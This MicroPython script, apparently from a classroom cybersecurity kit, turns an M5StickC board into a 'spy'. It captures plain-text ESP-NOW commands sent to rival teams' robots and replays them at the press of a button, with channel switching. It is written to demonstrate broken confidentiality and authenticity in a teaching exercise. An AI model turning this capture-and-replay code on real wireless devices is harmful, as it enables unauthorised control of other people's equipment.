# espiao.py  (antigo ciberseg-lego/.../espiao_m5_replay.py; 2026-11: troca de canal no botao B)
# Espiao (broadcast, texto claro) rodando num M5StickC PlusSE.
# SEM terminal: a placa tem TELA
# (mostra os comandos interceptados) e dois BOTOES (fazem o replay). Assim o
# espiao pode rodar numa power bank, longe do PC, e ainda demonstrar:
#   captura  -> aparece na tela o que o controle mandou ao robo (quebra de confidencialidade)
#   replay   -> aperta o botao e o robo obedece ao impostor (quebra de autenticidade)
#
# Grave na placa M5 como main.py (inicia sozinho ao ligar):
#   mpremote connect /dev/cu.usbserial-7D5A347739 fs cp micropython/espiao/espiao.py :main.py
# A pasta m5/ (driver de tela/energia, m5_display) ja esta na placa e NAO deve ser
# apagada. Ela NAO esta no repositorio: faca backup com
#   mpremote connect <porta-espiao> fs cp -r :m5 micropython/espiao/
#
# CONTROLES (na propria placa, sem PC):
#   Botao A (frente, GPIO37) -> REPLAY do item selecionado (o [>] na tela)
#   Botao B (lateral, GPIO39)-> toque curto: move a selecao pelo historico
#                               SEGURAR (>= 0,8 s): troca de canal 1 -> 6 -> 11 -> 1
#
# CORRIDA (uma equipe por canal 1/6/11): o espiao ataca os RIVAIS. Segure B ate achar
# o canal onde aparecem os comandos deles. O canal fica gravado em canal.txt (vale
# apos reiniciar). O historico NAO e apagado ao trocar: da para repetir num canal um
# comando capturado em outro.

import network
import espnow
import time
from machine import Pin
from m5 import m5_display

CANAL = 1                 # canal inicial (se nao houver canal.txt)
CANAIS = (1, 6, 11)       # canais percorridos ao segurar o botao B
SEGURAR_MS = 800          # tempo de botao B apertado para trocar de canal
ARQ_CANAL = 'canal.txt'

try:
    with open(ARQ_CANAL) as f:
        CANAL = int(f.read().strip())
except Exception:
    pass
BROADCAST = b'\xff' * 6
HIST_MAX = 8              # quantos comandos capturados a tela guarda

# ---------- Radio ESP-NOW ----------
def mac_str(b):
    return ':'.join('%02x' % x for x in b)

sta = network.WLAN(network.STA_IF)
sta.active(True)
sta.disconnect()              # ESP-NOW nao precisa de rede WiFi
sta.config(channel=CANAL)
sta.config(pm=sta.PM_NONE)    # radio sempre acordado (nao perder pacotes)

e = espnow.ESPNow()
e.config(rxbuf=2048)
e.active(True)
e.add_peer(BROADCAST)         # precisa para poder ENVIAR (replay)

# ---------- Tela ----------
W = m5_display.WHITE
B = m5_display.BLACK
AMBAR = 0xFD20                # destaque do ultimo comando (laranja em RGB565)
VERDE = 0x07E0                # confirma o replay enviado

display = m5_display.Display()

# ---------- Botoes (ativos em nivel baixo, sem pull-up interno na placa) ----------
btn_a = Pin(37, Pin.IN)       # frente -> replay
btn_b = Pin(39, Pin.IN)       # lateral -> move a selecao

def pressed(pin):
    return pin.value() == 0

# ---------- Estado ----------
historico = []                # ultimos comandos capturados (texto)
total = 0                     # quantos pacotes ja foram vistos
sel = 0                       # indice selecionado no historico (0 = mais antigo guardado)
msg_rodape = "A=replay B=sel"
canal = CANAL
rodape_cor = W

def nome_comando(c):
    # Deixa o comando legivel na tela sem depender de a fonte ter acentos.
    return {
        "F": "FWD", "T": "BACK", "E": "LEFT",
        "D": "RIGHT", "P": "STOP",
    }.get(c.upper(), c)

def desenhar():
    display.fill(B)
    display.draw_text_centered(2, 'SPY', AMBAR, B, scale=2)
    display.draw_text_centered(26, 'cap:%d  ch %d' % (total, canal), W, B)

    if not historico:
        display.draw_text_centered(90, 'listening', W, B)
        display.draw_text_centered(112, '...', W, B)
    else:
        # Destaque: ULTIMO comando capturado, grande, visivel de longe.
        ultimo = nome_comando(historico[-1])
        display.draw_text_centered(52, ultimo[:6], AMBAR, B, scale=2)

        # Historico numerado; [>] marca o que o botao A vai repetir.
        y = 92
        for i, c in enumerate(historico):
            marca = '>' if i == sel else ' '
            linha = '%s %s' % (marca, nome_comando(c))
            cor = VERDE if i == sel else W
            display.draw_text(2, y, linha[:13], cor, B)
            y += 14

    display.draw_text_centered(224, msg_rodape, rodape_cor, B)

def registrar(texto):
    global total, sel
    total += 1
    historico.append(texto)
    if len(historico) > HIST_MAX:
        historico.pop(0)
    sel = len(historico) - 1   # seleciona sempre o mais recente ao capturar

def enviar_replay():
    global msg_rodape, rodape_cor
    if not historico:
        return
    cmd = historico[sel]
    e.send(BROADCAST, cmd.encode())
    msg_rodape = "REPLAY: %s" % nome_comando(cmd)[:6]
    rodape_cor = VERDE

def mover_selecao():
    global sel, msg_rodape, rodape_cor
    if not historico:
        return
    sel = (sel + 1) % len(historico)
    msg_rodape = "A=replay B=sel"
    rodape_cor = W

def trocar_canal():
    global canal, msg_rodape, rodape_cor
    i = CANAIS.index(canal) if canal in CANAIS else -1
    canal = CANAIS[(i + 1) % len(CANAIS)]
    sta.config(channel=canal)
    try:
        with open(ARQ_CANAL, 'w') as f:
            f.write(str(canal))
    except Exception:
        pass
    msg_rodape = "CHANNEL %d" % canal
    rodape_cor = AMBAR

# ---------- Laco principal ----------
desenhar()
last_a, last_b = pressed(btn_a), pressed(btn_b)
b_desde = None            # quando o botao B foi apertado (None = solto)
b_trocou = False          # ja trocou de canal neste aperto (nao move a selecao ao soltar)

while True:
    mudou = False

    # 1) Radio: chegou pacote? (0 = nao espera)
    host, msg = e.recv(0)
    if msg is not None:
        try:
            texto = msg.decode().strip()
        except Exception:
            texto = repr(msg)
        if texto:
            registrar(texto)
            mudou = True

    # 2) Botoes (deteccao de borda: so age ao apertar)
    a, b = pressed(btn_a), pressed(btn_b)
    if a and not last_a:
        enviar_replay()
        mudou = True
    agora = time.ticks_ms()
    if b and not last_b:
        b_desde, b_trocou = agora, False
    if b and b_desde is not None and not b_trocou \
            and time.ticks_diff(agora, b_desde) >= SEGURAR_MS:
        trocar_canal()                  # segurou: troca o canal (uma vez por aperto)
        b_trocou = True
        mudou = True
    if not b and last_b:
        if not b_trocou:
            mover_selecao()             # toque curto: move a selecao
            mudou = True
        b_desde = None
    last_a, last_b = a, b

    if mudou:
        desenhar()

    time.sleep_ms(15)
